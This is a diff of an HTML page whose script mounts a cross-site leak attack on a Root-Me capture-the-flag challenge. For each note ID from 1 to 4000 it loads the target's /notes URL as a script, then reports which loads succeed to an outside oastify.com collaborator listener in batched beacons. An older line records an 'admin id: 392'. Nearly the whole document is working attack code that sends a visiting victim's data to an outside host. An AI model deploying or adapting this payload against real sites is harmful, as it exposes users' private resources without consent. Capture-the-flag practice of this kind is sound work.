@@ -1,30 +1,84 @@
 <!DOCTYPE html>
 <html>
 <head>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <title></title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title></title>
 </head>
 <body>
-<script type="text/javascript">
-// everything should be HTTPS
-// interactsh-client -v -http-only
-const listener = 'https://d3hf8gt505zvmoc493wglh73wu2lqbe0.oastify.com';
+<script>
+const listener   = 'https://d3hf8gt505zvmoc493wglh73wu2lqbe0.oastify.com';
+const target     = 'https://web-client-ch56.challenge01.root-me.org:58056/notes';
+const START_ID   = 1;
+const END_ID     = 4000;
+const BATCH_SIZE = 8;        // concurrent probes
+const DELAY_MS   = 150;      // throttle between batches
+const PROGRESS   = 500;      // beacon progress every N IDs
 
-function gotIt(id) {
-        fetch(listener + '/?id=' + id, {"method": "GET", "mode": "no-cors"}); // admin id: 392
+const found = [];
+let processed = 0;
+const scanStart = Date.now();
+
+function beacon(type, data) {
+    const p = new URLSearchParams({ type, t: Date.now(), ...data });
+    fetch(`${listener}/?${p}`, { method: 'GET', mode: 'no-cors' }).catch(()=>{});
 }
 
-function probeError(url) {
-        let script = document.createElement('script');
-        script.src = url;
-        script.onload = () => gotIt(url.split('/').pop());
-        document.head.appendChild(script);
+function probe(id) {
+    return new Promise((resolve) => {
+        const s = document.createElement('script');
+        let done = false;
+        const finish = () => {
+            if (done) return;
+            done = true;
+            s.remove();
+            resolve();
+        };
+        
+        s.src = `${target}/${id}`;
+        s.onload = () => {
+            found.push(id);
+            beacon('HIT', { id });
+            finish();
+        };
+        s.onerror = finish;
+        setTimeout(finish, 4000); // kill hung requests
+        
+        document.head.appendChild(s);
+    });
 }
 
-for(let i = 1; i <= 4000; i++) {
-        probeError(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${i}`);
+async function run() {
+    beacon('START', { range: `${START_ID}-${END_ID}`, ts: scanStart });
+    
+    const ids = Array.from({length: END_ID - START_ID + 1}, (_,i) => START_ID + i);
+    
+    while (ids.length) {
+        const batch = ids.splice(0, BATCH_SIZE);
+        await Promise.all(batch.map(probe));
+        
+        processed += batch.length;
+        
+        if (processed % PROGRESS === 0 || !ids.length) {
+            beacon('PROGRESS', { 
+                done: processed, 
+                total: END_ID, 
+                hits: found.length,
+                hits_ids: found.join(',') || 'none'
+            });
+        }
+        
+        if (ids.length) await new Promise(r => setTimeout(r, DELAY_MS));
+    }
+    
+    beacon('END', {
+        duration: Date.now() - scanStart,
+        total_hits: found.length,
+        hits: found.join(',') || 'none'
+    });
 }
+
+run();
 </script>
 </body>
 </html>
